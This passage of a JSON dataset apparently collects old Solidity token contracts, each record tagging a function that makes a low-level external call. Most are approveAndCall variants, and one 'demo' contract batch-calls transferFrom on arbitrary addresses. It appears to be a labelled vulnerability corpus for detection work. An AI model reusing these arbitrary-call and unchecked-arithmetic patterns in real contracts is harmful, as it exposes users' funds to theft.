Defroze(msg.sender,true);\n }\n function transfer(address _to, uint256 _value) public returns (bool)\n {\n require(balancesCanSell[msg.sender]);\n return BasicToken.transfer(_to,_value);\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool)\n {\n require(balancesCanSell[msg.sender]);\n return StandardToken.transferFrom(_from,_to,_value);\n }\n function freezeAccount(address target, bool canSell) onlyOwner\n {\n balancesCanSell[target] = canSell;\n FrozenFunds(target, canSell);\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n function getBlockTimestamp() constant returns (uint256)\n {\n return now;\n }\n function getOwnerInfos() constant returns (address ownerAddr, uint256 ownerBalance)\n {\n ownerAddr = owner;\n ownerBalance = balanceOf(ownerAddr);\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb156b"
  },
  "filename": "34468.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract MXLToken is StandardToken {\n function () {\n throw;\n }\n string public name = 'MXL Token';\n uint8 public decimals = 18;\n string public symbol = 'MXL';\n string public version = 'H0.1';\n function MXLToken() {\n balances[msg.sender] = 999999999000000000000000000;\n totalSupply = 999999999000000000000000000;\n name = 'MXL Token';\n decimals = 18;\n symbol = 'MXL';\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb156c"
  },
  "filename": "34474.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract Etheroll is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function Etheroll(\n ) {\n balances[msg.sender] = 7001622000000000000000000;\n totalSupply = 7001622000000000000000000;\n name = \"Etheroll\";\n decimals = 18;\n symbol = \"DICE\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb156d"
  },
  "filename": "345.sol",
  "content": "pragma solidity ^0.4.0;\ncontract demo{\n function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){\n require(_tos.length > 0);\n bytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\n for(uint i=0;i<_tos.length;i++){\n caddress.call(id,from,_tos[i],v);\n }\n return true;\n }\n}",
  "extract_feature": [
    "function transfer(address from,address caddress,address[] _tos,uint v)public returns (bool){\nrequire(_tos.length > 0);\nbytes4 id=bytes4(keccak256(\"transferFrom(address,address,uint256)\"));\nfor(uint i=0;i<_tos.length;i++){\ncaddress.call(id,from,_tos[i],v);\n}\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb156e"
  },
  "filename": "34515.sol",
  "content": "pragma solidity ^0.4.4;\ncontract NEOBleu {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is NEOBleu {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function NEOBleu(\n ) {\n balances[msg.sender] = 1000000000;\n totalSupply = 1000000000;\n name = \"NEOBleu\";\n decimals = 3;\n symbol = \"NEOB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb156f"
  },
  "filename": "34516.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract CoinciergeClubCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function CoinciergeClubCoin(\n ) {\n balances[msg.sender] = 1000000000000000000000000000;\n totalSupply = 1000000000000000000000000000;\n name = \"Coincierge Club Coin\";\n decimals = 18;\n symbol = \"CCC\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1570"
  },
  "filename": "34517.sol",
  "content": "pragma solidity ^0.4.16;\ncontract TokenERC20 {\n uint256 public totalSupply;\n function transfer(address _to, uint256 _value) returns (bool success);\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success);\n function approve(address _spender, uint256 _value) returns (bool success);\n function allowance(address _owner, address _spender) constant returns (uint256 remaining);\n function balanceOf(address _owner) constant returns (uint256 balance);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ninterface TokenNotifier {\n function receiveApproval(address from, uint256 _amount, address _token, bytes _data);\n}\ncontract SafeMath {\n function safeMul(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function safeSub(uint256 a, uint256 b) internal constant returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function safeAdd(uint256 a, uint256 b) internal constant returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract StandardToken is TokenERC20, SafeMath {\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n function transfer(address _to, uint256 _value) returns (bool success) {\n require(balances[msg.sender] >= _value);\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n uint256 allowance = allowed[_from][msg.sender];\n require(balances[_from] >= _value && allowance >= _value);\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(allowed[_from][msg.sender], _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract COGNXToken is StandardToken {\n uint8 public constant decimals = 18;\n string public constant name = 'COGNX';\n string public constant symbol = 'COGNX';\n string public constant version = '1.0.0';\n uint256 public totalSupply = 15000000 * 10 ** uint256(decimals);\n function COGNXToken() public {\n balances[msg.sender] = totalSupply;\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n require(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nrequire(_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData));\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1571"
  },
  "filename": "34531.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract EIDOO is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function EIDOO(\n ) {\n balances[msg.sender] = 90730;\n totalSupply = 900000000;\n name = \"EIDOO\";\n decimals = 1;\n symbol = \"EDO\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1572"
  },
  "filename": "34562.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HippoBohemianToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function HippoBohemianToken(\n ) {\n balances[msg.sender] = 100000;\n totalSupply = 100000;\n name = \"HippoBohemian\";\n decimals = 0;\n symbol = \"HPB\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1573"
  },
  "filename": "34573.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract ERC20Token is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function ERC20Token(\n ) {\n balances[msg.sender] = 5000000000;\n totalSupply = 5000000000;\n name = \"LondonCurrency\";\n decimals = 0;\n symbol = \"LDX\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1574"
  },
  "filename": "34578.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract HuemulCoin is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = 'H1.0';\n function HuemulCoin() {\n balances[msg.sender] = 17373831;\n totalSupply = 17373831;\n name = \"huemulCoin\";\n decimals = 3;\n symbol = \"HML\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1575"
  },
  "filename": "34583.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\ncontract CopyPasteToken is StandardToken {\n function () {\n throw;\n }\n string public name;\n uint8 public decimals;\n string public symbol;\n string public version = '1.0';\n function CopyPasteToken(\n ) {\n balances[msg.sender] = 50000000000;\n totalSupply = 50000000000;\n name = \"CopyPasteToken\";\n decimals = 2;\n symbol = \"CPT\";\n }\n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}",
  "extract_feature": [
    "function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\nallowed[msg.sender][_spender] = _value;\nApproval(msg.sender, _spender, _value);\nif(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663b8db6fcb296bdecdb1576"
  },
  "filename": "34598.sol",
  "content": "pragma solidity ^0.4.4;\ncontract Token {\n function totalSupply() constant returns (uint256 supply) {}\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n function transfer(address _to, uint256 _value) returns (bool success) {}\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n function approve(address _spender, uint256 _value) returns (bool success) {}\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n}\ncontract StandardToken is Token {\n function transfer(address _to, uint256 _value) returns (bool success) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint256 _value) returns (bool success) {\n 